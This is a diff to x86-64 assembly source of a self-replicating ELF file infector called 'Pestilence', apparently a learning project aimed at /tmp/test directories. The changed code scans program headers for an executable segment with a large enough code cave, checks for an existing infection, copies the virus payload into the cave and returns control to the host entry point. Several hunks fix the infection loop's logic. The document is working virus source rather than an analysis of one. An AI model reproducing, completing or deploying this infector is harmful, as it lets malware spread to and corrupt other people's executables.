@@ -95,13 +95,13 @@ _start:
 	.finish:
 	; Restore stack and jump to host entry
 			pop rax
-            leave
-            pop rdx
-            pop rcx
-            pop rsi
-            pop rdi
-        ; RAX is address of host program entry
-            jmp rax
+			leave
+			pop rdx
+			pop rcx
+			pop rsi
+			pop rdi
+		; RAX is address of host program entry
+			jmp rax
 
 
 processFile:
@@ -119,7 +119,7 @@ processFile:
 			pop rsi
 		.copyFileName:
 			movsb
-			cmp byte [rsi], 0
+			cmp byte [rsi - 1], 0
 			jnz .copyFileName
 
 	.openFile:
@@ -168,17 +168,17 @@ processFile:
 
 	.unmap:
 			mov rax, SYSCALL_MUNMAP
-            mov rdi, VALUE(s_pestilence.file_data)
-            mov rsi, VALUE(s_pestilence.file_size)
-            syscall
+			mov rdi, VALUE(s_pestilence.file_data)
+			mov rsi, VALUE(s_pestilence.file_size)
+			syscall
 
-    .closeFile:
-	        mov rax, SYSCALL_CLOSE
-	        mov rdi, VALUE(s_pestilence.file_fd)
-	        syscall
+	.closeFile:
+			mov rax, SYSCALL_CLOSE
+			mov rdi, VALUE(s_pestilence.file_fd)
+			syscall
 
-    .return:
-            ret
+	.return:
+			ret
 
 
 isElf64:
@@ -216,9 +216,9 @@ injectVirus:
 	; RDI => file mapping
 			push r13
 			push r14
+			mov r15, rdi
 
 	.getELFHeadersInfo:
-			mov r15, rdi
 			mov rdx, qword [rdi + elf64_ehdr.e_entry]
 			movzx rcx, word [rdi + elf64_ehdr.e_phnum]
 			mov rax, qword [rdi + elf64_ehdr.e_phoff]
@@ -227,19 +227,25 @@ injectVirus:
 			mov r14, rdi
 
 	.findCodeCave:
-		.checkCurrentSegment:
+		.checkSegmentType:
 		; If e_phnum is 0, we checked all the segments
 			cmp rcx, 0
 			jle .return
 		; Segment must be PT_LOAD with flags (PF_X | PF_R) on
 			mov rax, SEGMENT_TYPE
 			cmp rax, qword [rdi]
-			jnz .nextSegment
+			jz .checkSpace
+
+		.nextSegment:
+			add rdi, elf64_phdr_size
+			dec rcx
+			jmp .checkSegmentType
+
+		.checkSpace:
 		; Check if code cave is large enough
 		; Get end of segment
 			mov rax, qword [rdi + elf64_phdr.p_offset]
 			add rax, qword [rdi + elf64_phdr.p_filesz]
-			mov r13, rax
 			lea rdi, [r15 + rax]
 			mov rsi, rdi
 		; Loop for PAYLOAD_SIZE as long as [rdi] is '\0'
@@ -247,12 +253,7 @@ injectVirus:
 			mov rcx, PAYLOAD_SIZE
 			repz scasb
 			test rcx, rcx
-			jz .checkAlreadyInfected
-
-		.nextSegment:
-			add rdi, elf64_phdr_size
-			dec rcx
-			jmp .checkCurrentSegment
+			jnz .return
 
 	.checkAlreadyInfected:
 		; RSI => segment end
@@ -262,6 +263,7 @@ injectVirus:
 			jz .return
 
 	.injectPayload:
+		; RSI => segment end
 		; Copy PAYLOAD_SIZE bytes from _start to segment end
 			lea rdi, [rel _start]
 			xchg rdi, rsi
@@ -293,6 +295,6 @@ injectVirus:
 data:
 	infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
 	signature: db "Pestilence v1.0 (c)oded by tblaudez", 0
-    payloadEntry: dq _start
-    hostEntry: dq host
+	payloadEntry: dq _start
+	hostEntry: dq host
 _end:
